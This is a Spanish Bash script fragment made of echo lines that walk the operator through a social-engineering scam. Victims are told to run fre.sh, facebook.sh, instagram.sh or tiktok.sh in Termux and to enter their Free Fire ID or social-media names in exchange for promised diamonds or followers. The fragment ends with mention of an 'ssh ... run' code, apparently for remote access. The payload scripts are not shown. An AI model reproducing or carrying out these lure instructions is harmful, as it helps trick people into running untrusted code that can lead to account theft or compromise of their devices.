...
echo ''
echo 'con bash fre.sh le decimos que escriba su ID del Frefire y los diamantes'
echo ''
...
echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
echo ''
echo 'con bash facebook.sh le decimos que escriba su nombre del facebook  y le'
echo ''
...
echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
echo ''
echo 'con bash instagram.sh le decimos que escriba su nombre del instagram y le de enter'
echo ''
...
echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
echo ''
echo 'con bash tiktok.sh le decimos que escriba su nombre del tiktok y le de enter'
echo ''
echo 'le decimos que ingrese la cantidad de seguidores que desea tener'
echo ''
echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
